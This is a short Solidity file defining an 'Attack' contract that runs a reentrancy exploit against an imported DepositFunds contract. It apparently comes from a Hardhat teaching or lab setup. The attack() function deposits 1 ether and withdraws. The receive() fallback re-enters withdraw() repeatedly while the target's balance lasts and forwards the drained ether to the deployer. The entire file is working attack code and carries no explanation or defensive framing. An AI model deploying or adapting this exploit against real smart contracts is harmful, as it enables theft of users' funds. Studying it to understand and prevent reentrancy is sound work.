// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import './DepositFunds.sol';
import "hardhat/console.sol";

contract Attack {
    DepositFunds public depositFunds;
    address private owner_;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
        owner_ = msg.sender;
    }

    receive() external payable{
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
        owner_.call{value: msg.value}("");
    }


    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }

}